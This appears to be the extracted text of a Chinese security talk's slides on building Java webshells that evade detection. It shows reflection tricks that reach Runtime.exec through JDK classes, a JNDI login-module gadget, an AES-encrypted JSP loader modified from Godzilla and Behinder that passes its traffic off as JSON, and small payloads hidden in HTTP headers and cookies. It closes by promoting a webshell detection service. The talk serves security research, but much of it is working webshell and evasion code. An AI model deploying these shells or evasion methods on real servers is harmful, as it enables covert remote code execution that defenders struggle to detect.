JNI调用
JNDI注入
Js引擎
EL表达式
反射
BCEL加载
字节码
Jshell
第二层：反射属性
危险类篇
为什么要反射类属性？
• 有些可能导致命令执行函数的参数是来自于类属性
• 反射修改类属性比反射调用函数特征更弱，更为隐蔽
• 我们可以通过反射修改类属性来完成任意命令执行
•
sun.print.UnixPrintServiceLookup#getDefaultPrintService
(Public)
•
sun.print.UnixPrintServiceLookup#getDefaultPrinterNameBSD
(Private)
•
static sun.print.UnixPrintServiceLookup#execCmd
(Private)
•
java.lang.Runtime#exec
String[] lpcFirstCom = new String[]{"/usr/sbin/lpc status | grep : | sed -ne '1,1 s/://p'", "/usr/sbin/lpc 
status | grep -E '^[ 0-9a-zA-Z_-]*@' | awk -F'@' '{print $1}'"};
反射替换
String[] lpcFirstCom = new String[]{"open –a
Calculator"};
Field pollServices = 
UnixPrintServiceLookup.class.getDeclaredField("pollServices");
pollServices.setAccessible(true);
pollServices.set(null, false);//跳过判断限制
Field libFound = CUPSPrinter.class.getDeclaredField("libFound");
libFound.setAccessible(true);
libFound.set(null, false); //跳过判断限制
UnixPrintServiceLookup lookup = new UnixPrintServiceLookup();
Field osname = UnixPrintServiceLookup.class.getDeclaredField("osname");
osname.setAccessible(true);
osname.set(null, "Linux"); //跳过判断限制
Field lpcFirstCom = 
UnixPrintServiceLookup.class.getDeclaredField("lpcFirstCom");
lpcFirstCom.setAccessible(true);
lpcFirstCom.set(lookup, new String[]{"open -a Calculator"});
//要执行的恶意命令
lookup.getDefaultPrintService();
com.sun.javafx.property.PropertyReference#set
private void reflect() {
if (!reflected) {
reflected = true;
try {
... // 反射寻找setter跟getter方法
final Method m = 
clazz.getMethod(setterName, type);
if (Modifier.isPublic(m.getModifiers())) {
setter = m;
}
}
}
public void set(Object bean, T value) {
if (!isWritable())
throw new IllegalStateException(
"Cannot write to readonly property " + name);
assert setter != null;
try {
MethodUtil.invoke(setter, bean, new Object[] 
{value});
} catch (Exception ex) {
throw new RuntimeException(ex);
}
}
public boolean isWritable() {
reflect();
return setter != null;}
com.sun.javafx.property.PropertyReference#set
PropertyReference reference = new
PropertyReference(String.class, "test");
Field reflected = 
PropertyReference.class.getDeclaredField("reflected");
reflected.setAccessible(true);
reflected.set(reference, true);//跳过判断限制
Method method = Runtime.class.getDeclaredMethod("exec", 
String[].class);
Field setter = 
PropertyReference.class.getDeclaredField("setter");
setter.setAccessible(true);
setter.set(reference, method);//设置恶意方法
reference.set(Runtime.getRuntime(), new String[]{“bash”, 
“-c”, “open -a Calculator”});//要执行的恶意命令
第三层：无需反射
危险类篇
• 部分防守方做了一些变态的策略，反射函数跟反射属性都会被检测
• 我们可以找到一些可以直接实例化调用，且可以造成任意代码执行的类
• 仅利用正常的函数调用即可完成命令执行的目的，在文本层面毫无特征可言
• 判断首页是否是一个ZIP文件
• 获取目录下META-INF/services/javax.sound.midi.Soundbank
• 读取文件，获取全限定类名
• 将URL添加到创建的URLClassLoader中，查找类名并进行实例化
任意代码执行
 map = new HashMap<>();
map.put(module.USER_PROVIDER, request.getParameter("provider"));
map.put(module.GROUP_PROVIDER, "group");
JAASRealm realm = new JAASRealm();
realm.setContainer(new StandardContext());
module.initialize(null, new JAASCallbackHandler(realm, "user", 
"pass"), null, map);
module.login();
%>
•
com.sun.security.auth.module.JndiLoginModule#login
•
com.sun.security.auth.module.JndiLoginModule#attemptAuthentication
•
javax.naming.InitialContext#lookup
• 这些利用Java特性构造的Webshell，让安全人员也很难一眼也看出来有没有问题
• 通过自动化手段，我们发现JDK+Tomcat中还存在着很多类似的构造利用...
流量对抗篇
byte[] requestData = request.getParameter("passLine").getBytes();
requestData = unHex(requestData);
//hex解码
requestData = aes128(requestData, 2);
//aes128解码
Class payloadClass = null;
if ((payloadClass = (Class) application.getAttribute("randomStr")) == null) {
application.setAttribute("randomStr", new
Loader(getClass().getClassLoader()).loadClass(requestData));
} else {
java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
Object f = payloadClass.newInstance();
f.equals(request);f.equals(arrOut);f.equals(requestData);f.toString();
byte[] responseData = arrOut.toByteArray();arrOut.reset();
responseData = base64Encode(responseData);
arrOut.write(base64Decode(“eyJkYXRhIjo=”.getBytes()));//解码后 {"data":
arrOut.write(responseData);
arrOut.write(base64Decode(“IiwibWVzc2FnZSI6b... ".getBytes()));
//解码后
","message":null,"sessionTimeOut":false,"success":true,"token":null,"total
":0}
responseData = arrOut.toByteArray();
response.setStatus(200);
response.setHeader("Content-Type", "application/json;charset=UTF-8");
//伪装成json传输
response.getOutputStream().write(responseData);
}
•
基于哥斯拉二次开发
•
流量上采用HEX+128AES强加密
•
伪装成json传输
•
基于冰蝎二次修改
•
加密方式AES>DES
•
多条件判断，防止被骑马
•
修改默认握手方式为Cookie传递秘钥
•
继承子类调用defineClass->反射调
用defineClass
• 规律：不管是一般的，还是魔改的WebShell工具
都是通过POST传输
• 原因：使用defineClass方式的Webshell
Payload过于巨大，超过了默认的Tomcat Header
大小（8024字节），所以只能使用POST传输
• 结果：流量侧检测设备都是重点监控POST请求，
对其进行“特殊关照”
POST /behinder.jsp HTTP/1.1
Host: xxx
Content-Length: 11480
Cookie: JSESSIONID=xxx;
Connection: close
POST /godzilla.jsp HTTP/1.1
Host: xxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 49341
Connection: close
POST /antSword.jsp HTTP/1.1
Host: xxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 7438
Connection: close
•
本人设计的基于JS引擎的Webshell Payload非常小，约
为2KB，刚好可以放到Header中
•
意味着我们可以通过GET等形式进行通信，并且可以把
Payload放到Header中的任意字段，更为隐蔽
GET /antjs.jsp?mr6={PAYLOAD} HTTP/1.1
Host: xxx
Accept-Encoding: gzip, deflate
User-Agent: {PAYLOAD}
Cookie: token={PAYLOAD}
Connection: close
Shell原型
"use strict";
module.exports = (pwd, data, ext = {}) => {
ext.opts.httpConf.headers["Cookie"] =
`${pwd}=` + 
Buffer.from(data["_"]).toString("base64");
delete data["_"];
return data;
};
•
在蚁剑中可以通过编码器+修改后端发
包模块实现
•
蓝队经常通过HTTP响应头以及返回页面信息来过滤扫描流量，以及判断是否请求成功
•
修改响应头，将Payload回显编码后放到WAF拦截页面
•
伪装成报错页面
•
页面上的时间会动态刷新
•
安骑士Webshell检测系统在不断对抗的过程中，逐步发展出了静态规则+动态沙箱引擎+模拟污点引擎
+机器学习等多种综合手段，并会不受单一维度的绕过影响
•
目前安骑士已经对外开放Webshell的检测能力，支持API化、SDK化，方便各种环境下接入使用
•
欢迎各位小伙伴们前来测试体验，反馈并提出宝贵意见，测试地址：https://ti.aliyun.com